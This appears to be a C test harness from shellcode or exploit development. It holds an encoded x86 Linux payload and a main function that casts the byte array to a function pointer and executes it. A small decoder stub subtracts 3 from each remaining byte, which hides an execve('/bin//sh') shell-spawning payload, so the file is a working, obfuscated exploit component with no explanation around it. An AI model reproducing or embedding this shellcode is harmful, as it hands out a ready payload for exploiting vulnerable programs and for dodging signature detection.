#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x18\x5e\x31\xdb\x31\xc9\xb1\x15\x8a\x1e\xfe\xcb\xfe\xcb\xfe\xcb\x74\xfc\x88\x1e\x46\xe2\xf1\xeb\x05\xe8\xe3\xff\xff\xff\x34\xcc\xfa\xe4\x54\x6b\x32\x32\x76\x6b\x6b\x32\x65\x6c\x71\x8c\xe6\xb3\x0e\xd0\x83";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
